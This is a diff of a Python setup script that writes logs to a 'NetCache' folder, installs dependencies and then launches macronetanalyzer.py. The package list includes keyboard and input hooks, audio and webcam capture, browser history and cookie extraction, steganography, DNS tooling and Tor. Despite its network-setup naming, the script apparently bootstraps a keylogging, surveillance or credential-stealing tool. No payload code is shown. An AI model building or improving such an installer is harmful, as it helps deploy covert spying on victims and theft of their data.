@@ -3,63 +3,143 @@ import sys
 import subprocess
 import platform
 import logging
+from logging import handlers
 from pathlib import Path
 
-# ---------- Logging directory (Windows: support both NetCache and .netcache) ----------
-if platform.system() == "Windows":
-    base = os.environ.get("APPDATA", str(Path.home()))
-    netcache = Path(base) / "NetCache"
-    dot_netcache = Path(base) / ".netcache"
-    # create both to be safe (older scripts may use .netcache)
-    netcache.mkdir(parents=True, exist_ok=True)
-    dot_netcache.mkdir(parents=True, exist_ok=True)
-    log_dir = netcache  # prefer NetCache for logging
-else:
-    log_dir = Path.home() / ".netcache"
-    log_dir.mkdir(parents=True, exist_ok=True)
+# --------------------------- Robust logging ---------------------------
 
-log_file = log_dir / "netsetup.log"
-logging.basicConfig(
-    filename=str(log_file),
-    level=logging.INFO,
-    format="%(asctime)s - %(levelname)s - %(message)s",
-)
+def configure_logging():
+    """
+    Create a console logger + best-effort rotating file logger.
+    On Windows, prefer %APPDATA%\NetCache; also try %APPDATA%\.netcache.
+    Fall back to %TEMP% if needed. Use a distinct filename to avoid
+    collisions with any batch/bootstrapper logs.
+    """
+    logger = logging.getLogger()
+    logger.setLevel(logging.INFO)
+
+    # Always log to console too
+    ch = logging.StreamHandler(sys.stdout)
+    ch.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
+    logger.addHandler(ch)
+
+    # Candidate file targets in order
+    candidates = []
+    if platform.system() == "Windows":
+        base = os.environ.get("APPDATA", str(Path.home()))
+        netcache = Path(base) / "NetCache"
+        dot_netcache = Path(base) / ".netcache"
+        # Create both to satisfy older/newer paths
+        for d in (netcache, dot_netcache):
+            try:
+                d.mkdir(parents=True, exist_ok=True)
+            except Exception:
+                pass
+            candidates.append(d / "netsetup_py.log")
+    else:
+        d = Path.home() / ".netcache"
+        try:
+            d.mkdir(parents=True, exist_ok=True)
+        except Exception:
+            pass
+        candidates.append(d / "netsetup_py.log")
+
+    # Temp fallback last
+    candidates.append(Path(os.environ.get("TEMP", "/tmp")) / "netsetup_py.log")
+
+    for p in candidates:
+        try:
+            fh = handlers.RotatingFileHandler(str(p), maxBytes=1_000_000, backupCount=2, delay=True)
+            fh.setFormatter(logging.Formatter("%(asctime)s - %(levelname)s - %(message)s"))
+            logger.addHandler(fh)
+            logger.info("Logging to %s", p)
+            return
+        except Exception:
+            continue
+
+    logger.warning("All file log paths failed; continuing with console-only logging.")
+
+configure_logging()
 logging.info("Starting setup process...")
 
-PY = sys.executable  # the exact python running this script
+PY = sys.executable  # the exact Python running this script
 
 
 def _run(cmd, check=True):
-    """Run a command and log stdout/stderr to our log file."""
+    """Run a command and log stdout/stderr."""
     logging.info("EXEC: %s", " ".join(cmd))
-    result = subprocess.run(
-        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
-    )
-    if result.stdout:
-        logging.info(result.stdout.strip())
-    if check and result.returncode != 0:
-        logging.error("Command failed (%s): %s", result.returncode, " ".join(cmd))
-        raise subprocess.CalledProcessError(result.returncode, cmd)
-    return result.returncode
+    r = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    if r.stdout:
+        logging.info(r.stdout.strip())
+    if check and r.returncode != 0:
+        logging.error("Command failed (%s): %s", r.returncode, " ".join(cmd))
+        raise subprocess.CalledProcessError(r.returncode, cmd)
+    return r.returncode
 
 
 def ensure_pip():
-    """Make sure pip exists & is usable for this interpreter."""
+    """Ensure pip exists and is up to date for this interpreter."""
     try:
         _run([PY, "-m", "pip", "--version"], check=False)
     except Exception:
         pass
-    # ensurepip may be a no-op if pip already installed
+    # ensurepip may be a no-op; that's fine
     try:
         _run([PY, "-m", "ensurepip", "--upgrade"], check=False)
     except Exception:
         logging.info("ensurepip not available; continuing.")
-    # upgrade pip (best effort)
-    _run([PY, "-m", "pip", "install", "--upgrade", "pip"], check=False)
+    # Upgrade core build tooling (best effort)
+    _run([PY, "-m", "pip", "install", "--upgrade", "pip", "setuptools", "wheel"], check=False)
+
+
+def _module_import_name(pkg: str) -> str:
+    """
+    Map pip package names to importable module names for presence checks.
+    """
+    mapping = {
+        "pillow": "PIL",
+        "opencv-python": "cv2",
+        "opencv-python-headless": "cv2",
+        "browser-history": "browser_history",
+        "pywin32": "win32api",
+        "sounddevice": "sounddevice",
+        "wavio": "wavio",
+        "psutil": "psutil",
+        "keyboard": "keyboard",
+        "pynput": "pynput",
+        "requests": "requests",
+        "stegano": "stegano",
+        "dnspython": "dns",
+        "scapy": "scapy",
+        "browser_cookie3": "browser_cookie3",
+        "torpy": "torpy",
+    }
+    return mapping.get(pkg, pkg.replace("-", "_"))
+
+
+def _ensure_pkg(pkg: str, required: bool = True) -> bool:
+    """Import-check then install a package; return True if present after."""
+    mod = _module_import_name(pkg)
+    try:
+        __import__(mod)
+        logging.info("Requirement already satisfied: %s", pkg)
+        return True
+    except Exception:
+        logging.info("Installing %s package: %s", "required" if required else "optional", pkg)
+        rc = _run([PY, "-m", "pip", "install", pkg], check=False)
+        if rc != 0:
+            logging.error("Failed to install %s package: %s", "required" if required else "optional", pkg)
+            return False
+        try:
+            __import__(mod)
+            return True
+        except Exception:
+            logging.error("Installed but still cannot import: %s (%s)", pkg, mod)
+            return False
 
 
 def install_dependencies():
-    """Install required & optional packages with this interpreter."""
+    """Install required & optional packages for this interpreter."""
     required = [
         "keyboard",
         "pynput",
@@ -68,40 +148,30 @@ def install_dependencies():
         "psutil",
         "sounddevice",
         "wavio",
-        "opencv-python",
+        "opencv-python",   # will fallback to headless if needed
         "browser-history",
         "stegano",
         "dnspython",
     ]
     optional = ["scapy", "browser_cookie3", "torpy"]
 
-    # On Windows, add pywin32
     if platform.system() == "Windows":
         required.append("pywin32")
 
     for pkg in required:
-        try:
-            __import__(pkg.replace("-", "_"))
-            logging.info("Requirement already satisfied: %s", pkg)
-        except Exception:
-            logging.info("Installing required package: %s", pkg)
-            rc = _run([PY, "-m", "pip", "install", "-q", pkg], check=False)
-            if rc != 0:
-                logging.error("Failed to install required package: %s", pkg)
+        ok = _ensure_pkg(pkg, required=True)
+        # If opencv gui build fails, try headless variant
+        if not ok and pkg == "opencv-python":
+            logging.info("Attempting fallback: opencv-python-headless")
+            _ensure_pkg("opencv-python-headless", required=True)
 
     for pkg in optional:
-        try:
-            __import__(pkg.replace("-", "_"))
-            logging.info("Optional already satisfied: %s", pkg)
-        except Exception:
-            logging.info("Installing optional package: %s", pkg)
-            _run([PY, "-m", "pip", "install", "-q", pkg], check=False)
+        _ensure_pkg(pkg, required=False)
 
 
 def run_macronetanalyzer():
     """Run macronetanalyzer.py from the same directory as this setup script."""
-    repo_root = Path(__file__).resolve().parent
-    target = repo_root / "macronetanalyzer.py"
+    target = Path(__file__).resolve().parent / "macronetanalyzer.py"
     if not target.exists():
         logging.error("macronetanalyzer.py not found at: %s", target)
         sys.exit(1)
